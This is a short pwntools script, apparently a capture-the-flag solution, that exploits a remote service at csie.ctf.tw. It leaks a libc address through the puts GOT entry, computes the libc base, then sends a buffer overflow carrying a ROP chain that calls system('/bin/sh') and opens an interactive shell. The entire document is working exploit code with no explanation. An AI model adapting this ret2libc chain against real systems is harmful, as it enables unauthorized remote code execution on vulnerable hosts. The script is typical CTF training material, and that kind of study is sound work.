from pwn import *
padding = 56
puts_pot = "0x601018"
puts_off = 0x6f690
sh_offset = 0x18cd17
r = remote('csie.ctf.tw', 10127)
r.send(puts_pot + "\n")
r.recvuntil('content:')
puts_addr = r.recvline()
print puts_addr
base = int(puts_addr, 16) - puts_off
print hex(base)
system_addr = base + 0x45390
rdi_ret = 0x400823
r.send("A"*padding + p64(rdi_ret) + p64(base + sh_offset) + p64(system_addr) + p64(system_addr) + "\n")
r.interactive()
